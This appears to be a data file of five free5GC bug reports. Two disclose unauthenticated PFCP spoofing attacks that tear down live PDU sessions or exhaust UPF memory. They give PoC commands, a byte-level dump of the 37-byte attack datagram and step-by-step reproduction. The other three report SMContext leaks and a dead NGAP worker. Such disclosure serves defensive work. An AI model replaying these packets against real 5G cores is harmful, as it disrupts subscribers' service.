items.title: [Bugs] Unauthenticated PFCP Association Hijack & Permanently Unreclaimable `s.rnodes` Growth
items.body:
## Bug Description

A missing authentication vulnerability exists in the free5GC v4.2.3 UPF PFCP Association Setup handling. The UPF identifies PFCP peers only by the attacker-controlled Node ID and does not verify the packet source against the address of an existing association.

An unauthenticated attacker with network access to UDP/8805 can send a forged PFCP Association Setup Request using the Node ID of the legitimate SMF. The UPF then deletes the existing SMF association and all associated PFCP sessions before rebinding the Node ID to the attacker's source address. A single forged packet can therefore terminate active user-plane sessions and cause a persistent denial of service.

The same unauthenticated interface also accepts unlimited distinct Node IDs without removing stale associations. Repeated Setup Requests can continuously grow the UPF peer table and consume memory until the process is terminated by the OOM killer.

## To Reproduce

Prerequisites: a running free5GC v4.2.3 Docker stack with the SMF↔UPF PFCP association established and one UE registered with two PDU sessions (so there is live user-plane state to destroy). The PoC is pure Python 3 standard library (no dependencies).

1. **Deploy & gate end-to-end health.** Bring up the free5GC v4.2.3 compose stack, drive one UE to registration + two PDU sessions (`uesimtun0`/`uesimtun1` up), and confirm the SMF→UPF association exists. In this deployment the SMF Node ID is `smf.free5gc.org` and the UPF N4 endpoint is `upf.free5gc.org:8805` (10.100.200.3).

2. **Resolve the UPF N4 address** (docker re-assigns IPs across `down`/`up` cycles):
   ```bash
   UPF_IP=$(docker inspect upf --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
   ```

3. **Run the PoC** (`upf_assoc_hijack_poc.py`, Python 3 stdlib only — full source in [`pkgs/README.md`](README.md) §Complete PoC):
   ```bash
   # (a) Resource-exhaustion / leak: N distinct Node IDs -> N permanently unreclaimable s.rnodes entries
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak  --count 100000
   #     -> 100000/100000 accepted in ~22.4s, RSS 8.1->144 MiB, delete_node=0  (DESTRUCTIVE: memory)

   # (a-oom) OOM-crash variant: cap the UPF container at 2 GB, then send ~2 M distinct Node IDs
   docker update --memory 2g --memory-swap 2g upf
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --report-every 50000
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --leak-prefix leak2 --report-every 100000
   #     -> phase 1: 1M accepted, RSS 15->1 288 MB;  phase 2: RSS -> 2 091 MB -> kernel OOM kill
   #        (exit=137, OOMKilled=true, restarts=0; ~1.27 KiB per association)

   # (b) Hijack / mass teardown: ONE 37-byte datagram destroys all sessions of smf.free5gc.org
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --node-id smf.free5gc.org
   #     -> Cause=Request accepted; UPF logs "delete node ... sess:map[0x1,0x2]" + "sess deleted"x2 + "New node";
   #        loss 0%->100%, persists across UPF restart  (DESTRUCTIVE: user plane)

   # inspect the exact bytes without sending anything
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --dry-run
   ```

**The 37-byte attack datagram** (`--mode hijack --node-id smf.free5gc.org`):

```
20 05 00 21 00 00 01 00  00 3c 00 11 02 03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67 00 60 00 04 ee 52 08 a0
```

| Offset | Bytes | Meaning |
|---|---|---|
| 0 | `20` | PFCP v1, `S=0` (node-related, no SEID) |
| 1 | `05` | Message Type 5 = Association SetupRequest |
| 2-3 | `00 21` | Message Length = 33 (total 37) |
| 4-6 | `00 00 01` | Sequence Number = 1 |
| 7 | `00` | Spare |
| 8-9 | `00 3c` | IE Type 60 = **Node ID** |
| 10-11 | `00 11` | IE Length = 17 |
| 12 | `02` | Node ID Type = **FQDN** |
| 13-28 | `03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67` | length-prefixed `smf.free5gc.org` (**no** root terminator, matching go-pfcp) |
| 29-30 | `00 60` | IE Type 96 = **Recovery Time Stamp** |
| 31-32 | `00 04` | IE Length = 4 |
| 33-36 | `ee 52 08 a0` | Time stamp (decoded at `:42` and **discarded**) |

**Observed** (UPF returns acceptance in ~11 ms): `msg_type=6` (Association Setup Response), `cause=1 (Request accepted)`, `upf_node_id=upf.free5gc.org`. UPF log signature (the smoking gun): `delete node: &pfcp.RemoteNode{ID:"smf.free5gc.org", ..., sess:map[uint64]struct{}{0x1:..., 0x2:...}}` → `[CPSEID:0x1] sess deleted` → `[CPSEID:0x2] sess deleted` → `[CPNodeID:smf.free5gc.org] New node`. **Critical negative signature:** no `panic`, no `fatal`, no signal, no restart — `upf` stays `running`, `RestartCount=0`. Reproducibility: **4/4 = 100%** (hijack 2/2, leak 2/2) across full environment rebuilds.


## Screenshots

None

## Environment

- **free5GC Version:** v4.2.3 — `free5gc/upf:v4.2.3` (image digest `sha256:b1c4e6967db6e244b43c0cbe5bba498d3a55e506c580134ca131f5ee6df99c75`); source tree `v4.2.3-4-g387710d`, `internal/pfcp/association.go` has the identical vulnerable block at `:48-58` and no-op Release/Update at `:76-88`
- **Deployment:** Docker-based 5G Core Network (free5GC basic compose, 16 containers, N4 on bridge `10.100.200.0/24`; UPF N4 `upf.free5gc.org:8805` = 10.100.200.3; SMF Node ID `smf.free5gc.org`)
- **OS:** Ubuntu 22.04 Desktop
- **Kernel version:** 138~22.04.1-Ubuntu
- **go version:** 1.21.8 linux/amd64

## Trace Files

[Artifacts](https://media.githubusercontent.com/media/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260916-POC/packages.zip) present in this repository:

- `upf_assoc_hijack_poc.py`— the PoC (Python 3 stdlib; modes `hijack`/`leak`).
- `pcap/`— N4 PCAP capture (excluding SSH port 22) of the v4.2.3 hijack reproduction: `hijack.pcap` — the 37-byte attack datagram, the UPF's acceptance response, then silence (`hijack-tcpdump.txt` holds the capture stats).
- `logs/`— trimmed logs of the v4.2.3 hijack reproduction: `hijack-upf.log` (post-attack lines only: forged `handleAssociationSetupRequest` → `delete node` → `sess deleted` ×2 → `New node`) and `hijack-smf.log` (last 200 lines; its final entry, 12:56:11, is six seconds **before** the 12:56:17 attack — the SMF logged **zero** entries at/after it).


## Additional Context

- **Vulnerability Type:** Resource Exhaustion (Denial of Service). 
- **CWE:** CWE-306 (Missing Authentication for Critical Function, primary)
- **CVSS v4 (report assessment):**
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H`

items.title: [Bugs] SMContext leaked when GetTokenCtx fails during SM context create; empty 200 leaves the AMF with no smContextRef to release it
items.body:
## Bug Description
`HandlePDUSessionSMContextCreate` registers a new SMContext at line 78, then fetches an OAuth token from the NRF at line 134. If that fails, line 137 returns without releasing the context, without any response body, and without giving the AMF the `smContextRef` it would need to release it later.

Every request taking this path leaves a permanently unreleasable SMContext. Any NRF outage triggers it for every SM context create that arrives during the outage.

The sibling error path 25 lines above (line 109, DNN mismatch) does the right thing: it calls `makeEstRejectResAndReleaseSMContext`, which responds *and* releases. Only the token path omits it.

Three things are missing at line 137, and any one of them would have been enough to avoid the leak:
- no `RemoveSMContextFromAllNF(smContext, false)`
- no `c.JSON(...)`, so gin emits a bare `200` with an empty body
- no `smContextRef` in the response, so the AMF has no id to release with later

`smContext.Ref` is `uuid.New().URN()`, not derived from SUPI and PSI, so it cannot be reconstructed by an operator either.

Separately, returning `200` with an empty body for a failed create is itself a protocol defect: the AMF cannot distinguish it from success by status code.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef`:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L279-L284

```go
func NewSMContext(id string, pduSessID int32) *SMContext {
    smContext := new(SMContext)
    smContext.Ref = uuid.New().URN()
    smContextPool.Store(smContext.Ref, smContext)
    canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears both maps and returns the UE IP and four TEIDs. Its only caller is `RemoveSMContextFromAllNF`, so a path that does not call that never releases:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
...
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

**The error path that leaks.** Line 78 acquires:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L78

```go
smContext := smf_context.NewSMContext(createData.Supi, createData.PduSessionId)
```

Line 134 fetches the token, and line 137 returns:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L134-L138

```go
ctx, _, oauthErr := smf_context.GetSelf().GetTokenCtx(models.ServiceName_NUDM_SDM, models.NrfNfManagementNfType_UDM)
if oauthErr != nil {
    smContext.Log.Errorf("Get Token Context Error[%v]", oauthErr)
    return
}
```

**The sibling path 25 lines above does all three.** On a DNN mismatch:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L106-L110

```go
p.makeEstRejectResAndReleaseSMContext(c, smContext,
    nasMessage.Cause5GSMRequestRejectedUnspecified,
    &smf_errors.DnnNotSupported)
return
```

**Why line 134 fails in practice.** `GetTokenCtx` performs a live NRF fetch whenever OAuth is enabled:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/context.go#L306-L313

```go
func (c *SMFContext) GetTokenCtx(serviceName models.ServiceName, targetNF models.NrfNfManagementNfType) (
    context.Context, *models.ProblemDetails, error,
) {
    if !c.OAuth2Required {
        return context.TODO(), nil, nil
    }
    return oauth.GetTokenCtx(models.NrfNfManagementNfType_SMF, targetNF,
        c.NfInstanceID, c.NrfUri, string(serviceName))
}
```

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, no UPF. Subscriber `imsi-208930000000001`, DNN `internet`, `oauth: true`. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF holding a valid token; `GetTokenCtx`, `NewSMContext`, `RemoveSMContext` and the create handler are untouched. A probe in the SMF runs `runtime.GC()` and reports the map sizes, so anything still counted is reachable state.

**The leak, one request** — NRF alive, three creates:

    psid=1 http=500    INSUFFICIENT_RESOURCES_SLICE_DNN (no UPF, fails further down)
    psid=2 http=500
    psid=3 http=500
    probe: smContextPool 0          <- that path calls the release

Kill the NRF. Nothing else changes, same request:

    http=200
    body: (empty)
    probe: smContextPool 1          <- held

    [INFO] In HandlePDUSessionSMContextCreate
    [ERRO] Get Token Context Error[server no response]    <- L136, returns at L137
    [INFO] | 200 | POST /nsmf-pdusession/v1/sm-contexts   <- empty body, no Location

Line 78 ran, line 134 failed, line 137 returned. The AMF gets a `200` it cannot act on and never learns the UUID. The NRF-alive run is the control: same endpoint, same payload, same code, and the only difference is whether line 134 succeeds.

**Accumulation, 200 requests** — `pduSessionId` 11 through 210:

| requests sent | smContextPool | canonicalRef | heap objects |
|---|---|---|---|
| 50 | 41 | 43 | 21,819 |
| 100 | 91 | 93 | 25,956 |
| 150 | 141 | 143 | 30,139 |
| 200 | 191 | 193 | 34,245 |
| final, after forced GC | 201 | 203 | 35,025 |

Slope exactly 1 per request, no ceiling, unchanged by `runtime.GC()`. `Get Token Context Error` appears 201 times, one per leaked context, confirming every one took line 137.

Any NRF unavailability at that moment takes the failing branch. No unusual configuration, no fault injection: killing the NRF process is the entire trigger.

## Expected Behavior
When the token fetch at line 134 fails, the handler should release the SMContext and return a proper error response with a body, as the sibling DNN-mismatch path does via `makeEstRejectResAndReleaseSMContext`. It should not return a bare `200` with an empty body, and the AMF should receive a response it can act on.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config with only `oauth: true` set. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] In HandlePDUSessionSMContextCreate
    [ERRO] Get Token Context Error[server no response]
    [INFO] | 200 | POST /nsmf-pdusession/v1/sm-contexts

## System Architecture (Optional)
**Bare metal, single host.** NRF/UDR/UDM/PCF/SMF on loopback, no UPF.

## Walkthrough (Optional)
Line 134 sits before IP and TEID assignment, so those were not leaked in this run. Any future error return added between assignment and the `201` would exhaust those pools too, and an IP pool is far smaller than memory.

## Additional Context
For the duration of an NRF outage, every SM context create that reaches line 134 leaves an unreleasable SMContext. The AMF receives `200` with an empty body, so it either treats the create as successful or retries, and each retry with a new `pduSessionId` adds another context.

Each one holds thirteen maps, four ID generators, a BPManager and two UPTunnels, roughly 80 heap objects in the measured run. There is no eviction, no timeout and no sweep over `smContextPool`, and `Ref` is a UUID that was never sent to the AMF, so the only ways they are removed are an SMF restart or a later create for the same SUPI and pduSessionId.

items.title: [Bugs] One Spoofed PFCP Association Message Releases Every PDU Session on a Chosen UPF
items.body:
### Bug Description

The free5GC **SMF** decides *who sent* a PFCP (N4, UDP/8805) message by reading the **Node ID IE inside the message body** (`nodeIDFromIE(request.NodeID)`), never by checking the UDP source address. The source address is available in the handler and is simply not used. So any host that can deliver one UDP datagram to the SMF's N4 port can claim to be a UPF that the SMF is already associated with.

The logic is short. The SMF and the UPF are correctly associated and carrying live PDU Sessions. An attacker on a different host then sends two ordinary PFCP messages naming that UPF's Node ID:

1. an **Association Setup Request** with a Recovery Time Stamp newer than the SMF's own — the SMF concludes the UPF has restarted and releases everything it holds on it;
2. an **Association Update Request** with the same Node ID and the **SARR** bit set (IE 111 payload `0x01`) — the SMF concludes the UPF has asked to be released and terminates the sessions that remain.

Every PDU Session on that UPF is then gone, and the UEs recover only by re-registering, with new UE IP addresses.

The messages themselves are spec-legal and the SMF's reaction to them is the designed one; the defect is that it never verifies who sent them. Two negative controls show that the whole outcome hangs on that single bit: the same Update with no IE 111, or with IE 111 = `0x02` (URSS), is likewise accepted with `cause=1` and destroys nothing.

### To Reproduce

Tested target: free5GC **v4.3.0**, SMF N4 at `10.100.200.5:8805/udp`, UPF Node ID `10.100.200.3` (`upf.free5gc.org`). The attack is run from the Docker host (the compose bridge, `10.100.200.1`); root is not required.

1. **Deploy the target core** (tngf exits 0 by design):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/4.3.0
   docker compose -p free5gc-v430 up -d
   sleep 45                      # let the NFs register at the NRF
   ```

2. **Provision subscribers** (a fresh `dbdata` volume is empty — registration fails without this) **and start the UE**:

   ```bash
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --count 5 --core-network free5gc \
           --core-address 127.0.0.1 --webui-port 5000 \
           --initial-imsi-index 1 --plmn 20893 \
           --opc 8e27b6af0e692e750f32667a3b14605d \
           --ki 8baf473f2f8fd09487cccbd7097c6862 \
           --username admin --password free5gc --no-ims
   docker exec -d ueransim bash -c 'cd /ueransim && ./nr-ue -c ./config/uecfg.yaml > /tmp/ue.log 2>&1'
   sleep 40 && docker exec ueransim sh -c 'ip -br addr | grep uesimtun'
   # -> uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
   ```

3. **Run the negative controls** — both must be accepted with nothing torn down:

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260929-POC/b1_2_pfcp_assoc_release_poc.py
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-benign
   # -> round 1 step1 AssociationUpdateRequest(no SARR)   cause=1 (Request accepted)
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-urss
   # -> cause=1; SMF logs "reported that non-zero Usage Reports"; tunnels unchanged
   ```

4. **Fire the two-stage spoof** (25-octet Setup + 22-octet Update, 47 octets total) and verify the teardown:

   ```bash
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage both
   # -> step1 Setup cause=1; step2 Update(SARR=1) cause=1
   sleep 16
   docker exec ueransim sh -c 'ip -br addr | grep uesimtun'     # -> empty: both PDU Sessions gone
   docker logs smf --since <UTC timestamp from before step 4> 2>&1 | grep -E 'Recovery Time Stamp|Release all resources|Release IP'
   sleep 14                                                     # second wave: genuine Release to the real UPF times out
   ```

### Expected Behavior

The SMF must not accept node-identity claims from the message body of an unauthenticated datagram: a PFCP node message whose UDP source address does not belong to the configured UPF must be ignored, and a PDU Session teardown may only ever result from the genuine UPF's own association management.

### Screenshots

**PoC acceptance of both spoofed stages** (both answered `cause=1`):

```
[+] round 1 step1 AssociationSetupRequest             cause=1 (Request accepted)
[+] round 1 step2 AssociationUpdateRequest(SARR=1)    cause=1 (Request accepted)
```

**SMF teardown, wave 1** (`docker logs smf`, attack window) — the spoofed Setup invalidates the association and both PDU Sessions are released:

```
[WARN][SMF][PFCP]  UPF[10.100.200.3] sent Association Setup with a newer Recovery Time Stamp; invalidating association generation 1
[INFO][SMF][Main]  Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main]  Release all resources of UPF [upf.free5gc.org](10.100.200.3)
[INFO][SMF][Main]  Invalidated 2 PFCP sessions for UPF[upf.free5gc.org](10.100.200.3)
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[2] Release IP[10.61.0.1]
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[1] Release IP[10.60.0.1]
```

**Wave 2, ~12 s later** — the genuine Association Release the SMF sent to the innocent real UPF times out and the SMF cancels the association again:

```
[ERRO][SMF][PFCP] PFCP Association Release Request to UPF[upf.free5gc.org](10.100.200.3) failed: PFCP Association Release Request to 10.100.200.3:8805: PFCP request to 10.100.200.3:8805 timed out
[INFO][SMF][Main] Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main] Release all resources of UPF [upf.free5gc.org](10.100.200.3)
```

**Container oracle** — graceful teardown, no crash and no restart:

```
/smf running exit=0 restarts=0
/upf running exit=0 restarts=0
/amf running exit=0 restarts=0
```

**Tunnel oracle** — both PDU Sessions destroyed; the UE only recovers by re-registering (fresh IPs `10.60.0.2` / `10.61.0.2`):

```
before:  uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
after:   (no uesimtun* interfaces)
```

### Environment

Please complete the following information:
- free5GC Version: v4.3.0
- Deployment: Docker-based 5G Core Network
- OS: Ubuntu 20.04.6 LTS
- Kernel version: 5.15.0-139-generic
- go version: 1.27.1 linux/amd64

### Trace Files

None

### Additional Context

**Vulnerability Type.** Missing authentication for a critical function (CWE-306): the SMF's N4 endpoint trusts the Node ID IE from an unauthenticated datagram instead of validating the peer address, which is an authentication bypass by spoofing (CWE-290).

**Impact.** Any host that can reach the SMF's UDP/8805 can tear down the SMF↔UPF association and every PDU Session carried on that UPF with 47 octets; subscriber traffic stops until UEs re-register, and the SMF then amplifies the attack itself by cancelling the healthy association a second time.

**CVSS v4.** `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` — **6.8 (Medium)**.

items.title: [Bugs] SMContext, UE IP and TEIDs leaked when PDU session establishment reject fails after the 201 response
items.body:
## Bug Description
`HandlePDUSessionSMContextCreate` returns `201 Created` with a `Location` header as soon as it has handed PFCP session setup to a goroutine. If that setup then fails, `EstHandler` calls `sendPDUSessionEstablishmentReject` to tear the context down, but that function has three early returns before the one call that actually releases it, at the very end.

Taking any of the three leaves the SMContext registered in all three package-level maps, with its UE IP address and four TEIDs still allocated. Because the `201` already went out, the AMF believes the session was created and has no reason to send a release.

Reproduced below with no change to the leaking code: an association-only PFCP responder plus an absent AMF is enough. 31 requests leave 31 SMContexts, 31 `canonicalRef` entries, 31 `seidSMContextMap` entries and 31 UE IP addresses held, with zero `Release IP` log lines.

`sendPDUSessionEstablishmentAccept` has the same shape with four early returns and no release call at all.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef`, and into `seidSMContextMap` once PFCP context exists:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L282-L284

```go
smContext.Ref = uuid.New().URN()
smContextPool.Store(smContext.Ref, smContext)
canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears all three maps and returns the UE IP and four TEIDs:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
for _, pfcpSessionContext := range smContext.PFCPContext {
    seidSMContextMap.Delete(pfcpSessionContext.LocalSEID)
}
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
ReleaseTEID(smContext.LocalULTeidForSplitPDUSession)
ReleaseTEID(smContext.LocalDLTeidForSplitPDUSession)
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

Its only caller is `RemoveSMContextFromAllNF`, so missing that call means the context is never released.

**The response goes out before anything can fail.** PFCP setup is handed to a goroutine and the handler answers immediately:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L291-L306

```go
needUnlock = false
go func() {
    defer smContext.SMLock.Unlock()
    smContext.SendUpPathChgNotification("EARLY", SendUpPathChgEventExposureNotification)
    handler := func(smContext *smf_context.SMContext, success bool) {
        p.EstHandler(isDone, smContext, success)
    }
    ActivateUPFSession(smContext, handler)
    ...
}()
```

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L330-L331

```go
c.Header("Location", location)
c.JSON(http.StatusCreated, response)
```

By the time the goroutine can fail, the AMF already holds a `201` and a `smContextRef`.

**Where the release is skipped.** A failed PFCP establishment gives `success = false`, and `EstHandler` routes to the reject path:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L250-L263

```go
if success {
    p.sendPDUSessionEstablishmentAccept(smContext)
} else {
    p.sendPDUSessionEstablishmentReject(smContext, nasMessage.Cause5GSMNetworkFailure)
}
```

That function exists to tear the context down, yet the teardown is its last statement and three returns precede it:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L269-L308

```go
smNasBuf, err := smf_context.BuildGSMPDUSessionEstablishmentReject(
    smContext, nasMessage.Cause5GSMNetworkFailure)
if err != nil {
    logger.PduSessLog.Errorf("Build GSM PDUSessionEstablishmentReject failed: %s", err)
    return                                        // L276: no release
}
...
ctx, _, errToken := smf_context.GetSelf().GetTokenCtx(
    models.ServiceName_NAMF_COMM, models.NrfNfManagementNfType_AMF)
if errToken != nil {
    logger.PduSessLog.Warnf("Get NAMF_COMM context failed: %s", errToken)
    return                                        // L295: no release
}
rspData, err := p.Consumer().
    N1N2MessageTransfer(ctx, smContext.Supi, n1n2Request, smContext.CommunicationClientApiPrefix)
if err != nil || rspData == nil {
    logger.ConsumerLog.Warnf("N1N2MessageTransfer for SendPDUSessionEstablishmentReject failed: %+v", err)
    return                                        // L301: no release
}
...
p.RemoveSMContextFromAllNF(smContext, true)       // L307: the only release
```

This path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries.

**The accept path has the same shape.** `sendPDUSessionEstablishmentAccept` has four early returns and no release call anywhere:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L308-L369

Not releasing on success is correct, but a token or `N1N2MessageTransfer` failure means nothing reached the AMF while the context stays registered. Same defect, should be fixed in the same change.

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, subscriber `imsi-208930000000001`, DNN `internet`, `oauth: true`. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF; `datapath.go`, `NewSMContext` and `RemoveSMContext` are untouched.

Two ordinary failures are needed. The UPF must be associated but unresponsive to session messages: a ~90-line UDP stub answers Association Setup and Heartbeat, ignores Session Establishment. (With no UPF at all, selection skips it and the create fails earlier on a path that releases correctly.) The AMF is simply not started, so `GetTokenCtx(NAMF_COMM, AMF)` fails.

A probe in the SMF runs `runtime.GC()` and reports the three map sizes, so anything still counted is reachable state.

**The leak, one request:**

    http=201                                        <- AMF is told the session exists
    Location: .../sm-contexts/cd02218a-0ba0-4e97-9ff4-b4e7a602cc6c
    probe now    : smContextPool 1, canonicalRef 1, seidSMContextMap 1
    probe at 15s : smContextPool 1, canonicalRef 1, seidSMContextMap 1

What happened in between:

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts     <- response already sent
       ... 9 s later, in the goroutine ...
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response  <- L294, returns at L295

L307 is never reached. No `is deleted from pool`, no `Release IP`. The context, its IP and its TEIDs stay held while the AMF believes the session is up.

**Control, same setup:** remove the subscriber policy from the PCF and the create fails at `ApplySessionRules`, before the goroutine:

    [INFO] UE[imsi-...] PDUSessionID[1] Release IP[10.60.0.2]
    [INFO] smContext[urn:uuid:5ea46820-...] is deleted from pool

Same request, same code, released properly. Only the post-`201` async path leaks.

**Accumulation, 31 requests** — `pduSessionId` incrementing:

| requests | smContextPool | canonicalRef | seidSMContextMap | heap objects |
|---|---|---|---|---|
| 10 | 10 | 10 | 10 | 26,553 |
| 20 | 20 | 20 | 20 | 29,465 |
| 30 | 30 | 30 | 30 | 32,387 |
| 31, after forced GC | 31 | 31 | 31 | 32,730 |

Slope exactly 1 per request across all three maps, no ceiling, unchanged by `runtime.GC()`.

    'retry-out'                     31   every PFCP establishment failed
    'Get NAMF_COMM context failed'  31   every one reached L294
    'Allocated UE IP address'       31
    'Release IP'                     0   31 addresses out, none back

## Expected Behavior
When the reject path takes any early return (L276, L295, L301), and likewise when the accept path fails on a token or `N1N2MessageTransfer` error, the handler should still release the SMContext via `RemoveSMContextFromAllNF` before returning, so the context, its UE IP and its TEIDs are not leaked.

## Screenshots
N/A

## Environment
 - free5GC Version: v4.2.2 (SMF v1.4.3, `2232d299`)
 - OS: Ubuntu 24.04.5 LTS
 - Kernel version: 6.8.0-139-generic
 - go version: go1.27.0 linux/amd64
 - C compiler version (optional):

## Trace Files
### Configuration Files
N/A — default config with only `oauth: true` set. Reproduction conditions are described above.

### PCAP File
N/A — this is a code-logic issue, unrelated to the packet level.

### Log File

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response

## System Architecture (Optional)
Bare metal, single host. NRF/UDR/UDM/PCF/SMF on loopback, UPF replaced by an association-only UDP stub.

## Walkthrough (Optional)
The reject path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries. The IP pool binds long before memory does: a `/24` DNN pool holds 254 addresses, so a few hundred leaked contexts exhaust it and new sessions are refused for the whole DNN while `free -m` still looks fine.

## Additional Context
Each create that reaches the reject path and takes L276, L295 or L301 permanently holds one entry in each of the three maps, the SMContext itself (thirteen maps, four ID generators, a BPManager, two UPTunnels, roughly 80 heap objects in the measured run), one UE IP address and four TEIDs.

The AMF does hold `smContextRef` from the `201`, so a release is not structurally impossible the way it is when the identifier is never sent. But the AMF was told the session succeeded and has no reason to release it, and in this scenario the AMF is itself unreachable. In practice these contexts persist until the SMF restarts or a create with the same SUPI and PDU session id reclaims them.

State also diverges three ways: the AMF and UE believe a session exists, the UPF has no session installed, and the SMF holds a context it failed to tear down.

items.title: [Bugs] AMF NGAP worker permanently lost after handler panic, no restart mechanism
items.body:
## Bug Decription
free5gc v4.3.0 AMF introduces a Worker Pool for NGAP message processing, where 8 Workers process messages in parallel based on UE ID hashing. When a Worker encounters a panic (e.g., from the nil pointer dereference in the linked Handover issue), it dies permanently: the `recover()` in `Worker.run()` catches the panic and logs it, but the goroutine exits and is **never restarted**. Worse, the dead Worker's `stopChan` is not closed, so `Submit()` continues to accept tasks into the dead Worker's 4096-entry buffer — messages silently vanish.

After 4 panics kill Workers 0, 2, 4, and 6, all new gNB connections fail because NGSetupRequest is hardcoded to Worker 0 (which is dead). The AMF process remains alive but its NGAP interface is completely non-functional — a silent denial of service harder to detect than a crash.

## To Reproduce
1. Deploy free5gc v4.3.0 with default configuration; verify all 8 Workers start (`Worker N started` in log).
2. Trigger a panic in any Worker (e.g., using the Handover nil pointer dereference PoC from the linked issue). Each panic kills the Worker handling that UE.
3. Repeat 4 times with different UE IDs that hash to different Workers. The PoC's sequential AMF-UE-NGAP-IDs naturally hit Workers 2, 4, 6, 0 in order.
4. After 4 panics, attempt a new gNB connection (SCTP + NGSetupRequest).
5. **NGSetupRequest receives no response** — Worker 0 is dead, and the request was dispatched to its dead buffer.

## Expected Behavior
1. Workers should **restart automatically** after a panic, not die permanently.
2. If a Worker dies, its `stopChan` should be closed so that `Submit()` returns `false` and the caller knows the dispatch failed.
